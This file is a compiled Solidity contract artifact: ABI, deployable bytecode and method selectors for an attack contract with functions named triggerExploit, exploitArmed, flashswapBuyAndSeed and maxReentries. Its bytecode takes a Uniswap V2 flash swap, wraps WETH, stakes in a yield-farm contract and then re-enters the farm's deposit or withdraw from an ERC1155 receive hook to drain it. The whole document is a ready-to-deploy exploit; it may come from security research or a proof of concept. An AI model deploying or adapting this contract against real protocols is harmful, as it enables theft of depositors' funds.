{"abi":[{"type":"constructor","inputs":[{"name":"farm_","type":"address","internalType":"address"},{"name":"controller_","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"activePid","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"configure","inputs":[{"name":"pid_","type":"uint256","internalType":"uint256"},{"name":"maxReentries_","type":"uint256","internalType":"uint256"},{"name":"useWithdrawPath_","type":"bool","internalType":"bool"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"exploitArmed","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"},{"type":"function","name":"flashswapBuyAndSeed","inputs":[{"name":"pid_","type":"uint256","internalType":"uint256"},{"name":"tokenOut","type":"address","internalType":"address"},{"name":"pair","type":"address","internalType":"address"},{"name":"amountOut","type":"uint256","internalType":"uint256"},{"name":"repayAmount","type":"uint256","internalType":"uint256"},{"name":"tokenOutIsToken0","type":"bool","internalType":"bool"}],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"maxReentries","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"onERC1155BatchReceived","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"","type":"address","internalType":"address"},{"name":"","type":"uint256[]","internalType":"uint256[]"},{"name":"","type":"uint256[]","internalType":"uint256[]"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[{"name":"","type":"bytes4","internalType":"bytes4"}],"stateMutability":"pure"},{"type":"function","name":"onERC1155Received","inputs":[{"name":"","type":"address","internalType":"address"},{"name":"","type":"address","internalType":"address"},{"name":"id","type":"uint256","internalType":"uint256"},{"name":"value","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[{"name":"","type":"bytes4","internalType":"bytes4"}],"stateMutability":"nonpayable"},{"type":"function","name":"reentryCount","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"seedStake","inputs":[{"name":"pid_","type":"uint256","internalType":"uint256"},{"name":"token","type":"address","internalType":"address"},{"name":"amount","type":"uint256","internalType":"uint256"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"stakedAmount","inputs":[{"name":"pid_","type":"uint256","internalType":"uint256"}],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"triggerExploit","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"uniswapV2Call","inputs":[{"name":"sender","type":"address","internalType":"address"},{"name":"","type":"uint256","internalType":"uint256"},{"name":"","type":"uint256","internalType":"uint256"},{"name":"","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"useWithdrawPath","inputs":[],"outputs":[{"name":"","type":"bool","internalType":"bool"}],"stateMutability":"view"}],"bytecode":{"object":"0x60c060405234801561000f575f5ffd5b50604051611fd4380380611fd4833981810160405281019061003191906100fe565b8173ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff16815250508073ffffffffffffffffffffffffffffffffffffffff1660a08173ffffffffffffffffffffffffffffffffffffffff1681525050505061013c565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100cd826100a4565b9050919050565b6100dd816100c3565b81146100e7575f5ffd5b50565b5f815190506100f8816100d4565b92915050565b5f5f60408385031215610114576101136100a0565b5b5f610121858286016100ea565b9250506020610132858286016100ea565b9150509250929050565b60805160a051611e236101b15f395f818161056001528181610758015281816108470152610e6c01525f81816104bb01528181610624015281816106b201528181610b9a01528181610bc101528181610c5301528181610d3f01528181610dcd01528181610efe0152610f250152611e235ff3fe6080604052600436106100c5575f3560e01c8063808783841161007e578063bc197c8111610058578063bc197c8114610244578063e3be69dc14610280578063f23a6e611461029c578063ff201bc6146102d8576100cc565b806380878384146101c857806386b79640146101f05780638f20f7ed1461021a576100cc565b806310d1e85c146100d057806313caa01a146100f8578063352bb4ba1461012257806353b381691461014c5780635a459ed414610176578063701d8159146101b2576100cc565b366100cc57005b5f5ffd5b3480156100db575f5ffd5b506100f660048036038101906100f1919061135f565b610300565b005b348015610103575f5ffd5b5061010c610499565b60405161011991906113fd565b60405180910390f35b34801561012d575f5ffd5b506101366104ab565b6040516101439190611425565b60405180910390f35b348015610157575f5ffd5b506101606104b1565b60405161016d9190611425565b60405180910390f35b348015610181575f5ffd5b5061019c6004803603810190610197919061143e565b6104b7565b6040516101a99190611425565b60405180910390f35b3480156101bd575f5ffd5b506101c661055e565b005b3480156101d3575f5ffd5b506101ee60048036038101906101e99190611493565b610756565b005b3480156101fb575f5ffd5b50610204610816565b60405161021191906113fd565b60405180910390f35b348015610225575f5ffd5b5061022e610829565b60405161023b9190611425565b60405180910390f35b34801561024f575f5ffd5b5061026a60048036038101906102659190611538565b61082e565b6040516102779190611649565b60405180910390f35b61029a60048036038101906102959190611662565b610845565b005b3480156102a7575f5ffd5b506102c260048036038101906102bd91906116eb565b610c50565b6040516102cf9190611649565b60405180910390f35b3480156102e3575f5ffd5b506102fe60048036038101906102f99190611781565b610e6a565b005b600360029054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610390576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103879061182b565b60405180910390fd5b3073ffffffffffffffffffffffffffffffffffffffff168573ffffffffffffffffffffffffffffffffffffffff16146103fe576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016103f590611893565b60405180910390fd5b73c02aaa39b223fe8d0a0e5c4f27ead9083c756cc273ffffffffffffffffffffffffffffffffffffffff1663d0e30db06004546040518263ffffffff1660e01b81526004015f604051808303818588803b15801561045a575f5ffd5b505af115801561046c573d5f5f3e3d5ffd5b505050505061049273c02aaa39b223fe8d0a0e5c4f27ead9083c756cc233600454610fb0565b5050505050565b60035f9054906101000a900460ff1681565b60015481565b60025481565b5f5f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166393f1a40b84306040518363ffffffff1660e01b81526004016105149291906118c0565b6040805180830381865afa15801561052e573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061055291906118fb565b50905080915050919050565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146105ec576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016105e390611983565b60405180910390fd5b6001600360016101000a81548160ff0219169083151502179055505f60028190555060035f9054906101000a900460ff16156106b0577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663441a3e705f545f6040518363ffffffff1660e01b815260040161067e9291906119e3565b5f604051808303815f87803b158015610695575f5ffd5b505af11580156106a7573d5f5f3e3d5ffd5b5050505061073a565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663e2bbb1585f545f6040518363ffffffff1660e01b815260040161070c9291906119e3565b5f604051808303815f87803b158015610723575f5ffd5b505af1158015610735573d5f5f3e3d5ffd5b505050505b5f600360016101000a81548160ff021916908315150217905550565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146107e4576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016107db90611983565b60405180910390fd5b825f81905550816001819055508060035f6101000a81548160ff0219169083151502179055505f600281905550505050565b600360019054906101000a900460ff1681565b5f5481565b5f63bc197c8160e01b905098975050505050505050565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146108d3576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016108ca90611983565b60405180910390fd5b5f73ffffffffffffffffffffffffffffffffffffffff168473ffffffffffffffffffffffffffffffffffffffff1603610941576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161093890611a54565b60405180910390fd5b5f8311801561094f57505f82115b61098e576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161098590611abc565b60405180910390fd5b83600360026101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550816004819055508373ffffffffffffffffffffffffffffffffffffffff1663022c0d9f826109fd575f6109ff565b845b83610a0a5785610a0c565b5f5b306040518060400160405280600e81526020017f464c415348535741505f534545440000000000000000000000000000000000008152506040518563ffffffff1660e01b8152600401610a629493929190611b4a565b5f604051808303815f87803b158015610a79575f5ffd5b505af1158015610a8b573d5f5f3e3d5ffd5b505050505f600360026101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505f6004819055505f8573ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b8152600401610b119190611b94565b602060405180830381865afa158015610b2c573d5f5f3e3d5ffd5b505050506040513d601f19601f82011682018060405250810190610b509190611bad565b90505f8111610b94576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610b8b90611c22565b60405180910390fd5b610bbf867f0000000000000000000000000000000000000000000000000000000000000000836110ff565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663e2bbb15888836040518363ffffffff1660e01b8152600401610c1a929190611c40565b5f604051808303815f87803b158015610c31575f5ffd5b505af1158015610c43573d5f5f3e3d5ffd5b5050505050505050505050565b5f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610cdf576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610cd690611893565b60405180910390fd5b600360019054906101000a900460ff168015610cfb57505f5485145b8015610d0657505f84115b8015610d155750600154600254105b15610e565760025f81546001019190508190555060035f9054906101000a900460ff1615610dcb577f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663441a3e705f545f6040518363ffffffff1660e01b8152600401610d999291906119e3565b5f604051808303815f87803b158015610db0575f5ffd5b505af1158015610dc2573d5f5f3e3d5ffd5b50505050610e55565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663e2bbb1585f545f6040518363ffffffff1660e01b8152600401610e279291906119e3565b5f604051808303815f87803b158015610e3e575f5ffd5b505af1158015610e50573d5f5f3e3d5ffd5b505050505b5b63f23a6e6160e01b90509695505050505050565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614610ef8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401610eef90611983565b60405180910390fd5b610f23827f0000000000000000000000000000000000000000000000000000000000000000836110ff565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663e2bbb15884836040518363ffffffff1660e01b8152600401610f7e929190611c40565b5f604051808303815f87803b158015610f95575f5ffd5b505af1158015610fa7573d5f5f3e3d5ffd5b50505050505050565b5f5f8473ffffffffffffffffffffffffffffffffffffffff1663a9059cbb60e01b8585604051602401610fe4929190611c67565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161104e9190611cc8565b5f604051808303815f865af19150503d805f8114611087576040519150601f19603f3d011682016040523d82523d5f602084013e61108c565b606091505b50915091508180156110b957505f815114806110b85750808060200190518101906110b79190611cf2565b5b5b6110f8576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004016110ef90611d67565b60405180910390fd5b5050505050565b61110a83835f61111a565b61111583838361111a565b505050565b5f5f8473ffffffffffffffffffffffffffffffffffffffff1663095ea7b360e01b858560405160240161114e929190611c67565b604051602081830303815290604052907bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516111b89190611cc8565b5f604051808303815f865af19150503d805f81146111f1576040519150601f19603f3d011682016040523d82523d5f602084013e6111f6565b606091505b509150915081801561122357505f815114806112225750808060200190518101906112219190611cf2565b5b5b611262576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161125990611dcf565b60405180910390fd5b5050505050565b5f5ffd5b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61129a82611271565b9050919050565b6112aa81611290565b81146112b4575f5ffd5b50565b5f813590506112c5816112a1565b92915050565b5f819050919050565b6112dd816112cb565b81146112e7575f5ffd5b50565b5f813590506112f8816112d4565b92915050565b5f5ffd5b5f5ffd5b5f5ffd5b5f5f83601f84011261131f5761131e6112fe565b5b8235905067ffffffffffffffff81111561133c5761133b611302565b5b60208301915083600182028301111561135857611357611306565b5b9250929050565b5f5f5f5f5f6080868803121561137857611377611269565b5b5f611385888289016112b7565b9550506020611396888289016112ea565b94505060406113a7888289016112ea565b935050606086013567ffffffffffffffff8111156113c8576113c761126d565b5b6113d48882890161130a565b92509250509295509295909350565b5f8115159050919050565b6113f7816113e3565b82525050565b5f6020820190506114105f8301846113ee565b92915050565b61141f816112cb565b82525050565b5f6020820190506114385f830184611416565b92915050565b5f6020828403121561145357611452611269565b5b5f611460848285016112ea565b91505092915050565b611472816113e3565b811461147c575f5ffd5b50565b5f8135905061148d81611469565b92915050565b5f5f5f606084860312156114aa576114a9611269565b5b5f6114b7868287016112ea565b93505060206114c8868287016112ea565b92505060406114d98682870161147f565b9150509250925092565b5f5f83601f8401126114f8576114f76112fe565b5b8235905067ffffffffffffffff81111561151557611514611302565b5b60208301915083602082028301111561153157611530611306565b5b9250929050565b5f5f5f5f5f5f5f5f60a0898b03121561155457611553611269565b5b5f6115618b828c016112b7565b98505060206115728b828c016112b7565b975050604089013567ffffffffffffffff8111156115935761159261126d565b5b61159f8b828c016114e3565b9650965050606089013567ffffffffffffffff8111156115c2576115c161126d565b5b6115ce8b828c016114e3565b9450945050608089013567ffffffffffffffff8111156115f1576115f061126d565b5b6115fd8b828c0161130a565b92509250509295985092959890939650565b5f7fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b6116438161160f565b82525050565b5f60208201905061165c5f83018461163a565b92915050565b5f5f5f5f5f5f60c0878903121561167c5761167b611269565b5b5f61168989828a016112ea565b965050602061169a89828a016112b7565b95505060406116ab89828a016112b7565b94505060606116bc89828a016112ea565b93505060806116cd89828a016112ea565b92505060a06116de89828a0161147f565b9150509295509295509295565b5f5f5f5f5f5f60a0878903121561170557611704611269565b5b5f61171289828a016112b7565b965050602061172389828a016112b7565b955050604061173489828a016112ea565b945050606061174589828a016112ea565b935050608087013567ffffffffffffffff8111156117665761176561126d565b5b61177289828a0161130a565b92509250509295509295509295565b5f5f5f6060848603121561179857611797611269565b5b5f6117a5868287016112ea565b93505060206117b6868287016112b7565b92505060406117c7868287016112ea565b9150509250925092565b5f82825260208201905092915050565b7f4241445f504149520000000000000000000000000000000000000000000000005f82015250565b5f6118156008836117d1565b9150611820826117e1565b602082019050919050565b5f6020820190508181035f83015261184281611809565b9050919050565b7f4241445f53454e444552000000000000000000000000000000000000000000005f82015250565b5f61187d600a836117d1565b915061188882611849565b602082019050919050565b5f6020820190508181035f8301526118aa81611871565b9050919050565b6118ba81611290565b82525050565b5f6040820190506118d35f830185611416565b6118e060208301846118b1565b9392505050565b5f815190506118f5816112d4565b92915050565b5f5f6040838503121561191157611910611269565b5b5f61191e858286016118e7565b925050602061192f858286016118e7565b9150509250929050565b7f4f4e4c595f434f4e54524f4c4c455200000000000000000000000000000000005f82015250565b5f61196d600f836117d1565b915061197882611939565b602082019050919050565b5f6020820190508181035f83015261199a81611961565b9050919050565b5f819050919050565b5f819050919050565b5f6119cd6119c86119c3846119a1565b6119aa565b6112cb565b9050919050565b6119dd816119b3565b82525050565b5f6040820190506119f65f830185611416565b611a0360208301846119d4565b9392505050565b7f504149525f4d495353494e4700000000000000000000000000000000000000005f82015250565b5f611a3e600c836117d1565b9150611a4982611a0a565b602082019050919050565b5f6020820190508181035f830152611a6b81611a32565b9050919050565b7f4241445f464c41534853574150000000000000000000000000000000000000005f82015250565b5f611aa6600d836117d1565b9150611ab182611a72565b602082019050919050565b5f6020820190508181035f830152611ad381611a9a565b9050919050565b5f81519050919050565b5f82825260208201905092915050565b8281835e5f83830152505050565b5f601f19601f8301169050919050565b5f611b1c82611ada565b611b268185611ae4565b9350611b36818560208601611af4565b611b3f81611b02565b840191505092915050565b5f608082019050611b5d5f830187611416565b611b6a6020830186611416565b611b7760408301856118b1565b8181036060830152611b898184611b12565b905095945050505050565b5f602082019050611ba75f8301846118b1565b92915050565b5f60208284031215611bc257611bc1611269565b5b5f611bcf848285016118e7565b91505092915050565b7f4e4f5f534545445f4143515549524544000000000000000000000000000000005f82015250565b5f611c0c6010836117d1565b9150611c1782611bd8565b602082019050919050565b5f6020820190508181035f830152611c3981611c00565b9050919050565b5f604082019050611c535f830185611416565b611c606020830184611416565b9392505050565b5f604082019050611c7a5f8301856118b1565b611c876020830184611416565b9392505050565b5f81905092915050565b5f611ca282611ada565b611cac8185611c8e565b9350611cbc818560208601611af4565b80840191505092915050565b5f611cd38284611c98565b915081905092915050565b5f81519050611cec81611469565b92915050565b5f60208284031215611d0757611d06611269565b5b5f611d1484828501611cde565b91505092915050565b7f5452414e534645525f4641494c454400000000000000000000000000000000005f82015250565b5f611d51600f836117d1565b9150611d5c82611d1d565b602082019050919050565b5f6020820190508181035f830152611d7e81611d45565b9050919050565b7f415050524f56455f4641494c45440000000000000000000000000000000000005f82015250565b5f611db9600e836117d1565b9150611dc482611d85565b602082019050919050565b5f6020820190508181035f830152611de681611dad565b905091905056fea26469706673582212204e7c716b555959e560bd8b690ff39fef629cce362d5d9557b6f1b7ae98027a3e64736f6c634300081e0033","linkReferences":{}},"methodIdentifiers":{"activePid()":"8f20f7ed","configure(uint256,uint256,bool)":"80878384","exploitArmed()":"86b79640","flashswapBuyAndSeed(uint256,address,address,uint256,uint256,bool)":"e3be69dc","maxReentries()":"352bb4ba","onERC1155BatchReceived(address,address,uint256[],uint256[],bytes)":"bc197c81","onERC1155Received(address,address,uint256,uint256,bytes)":"f23a6e61","reentryCount()":"53b38169","seedStake(uint256,address,uint256)":"ff201bc6","stakedAmount(uint256)":"5a459ed4","triggerExploit()":"701d8159","uniswapV2Call(address,uint256,uint256,bytes)":"10d1e85c","useWithdrawPath()":"13caa01a"},"id":0}